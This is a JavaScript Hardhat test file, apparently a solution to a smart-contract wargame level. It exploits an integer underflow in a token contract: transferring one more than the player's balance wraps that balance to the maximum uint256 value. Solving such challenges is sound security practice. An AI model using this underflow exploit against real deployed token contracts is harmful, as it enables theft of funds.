const { expect } = require("chai");
const { ethers } = require("hardhat");
const {
    constants,
    expectRevert,
} = require('@openzeppelin/test-helpers');
require('dotenv').config({ path: __dirname + '/.env' });

const hre = require("hardhat");

const  TOKEN_ABI = [
    "function transfer(address _to, uint _value) public returns (bool)",
    "function balanceOf(address _owner) public view returns (uint balance)"
];

describe.only("Token hack", function() {
    beforeEach(async function() {
        [player] = await ethers.getSigners();
        token = new ethers.Contract(process.env.TOKEN_ADDRESS, TOKEN_ABI, ethers.provider);
});
    describe("Blalance modification", function() {
        it("Should change token balance of player to a very large amount", async function() {
            initialBalance = await token.balanceOf(player.address);
            await token.connect(player).transfer(process.env.TOKEN_ADDRESS, initialBalance.add(1));
            expect(await token.balanceOf(player.address)).to.equal(ethers.constants.MaxUint256);
        });
    });
});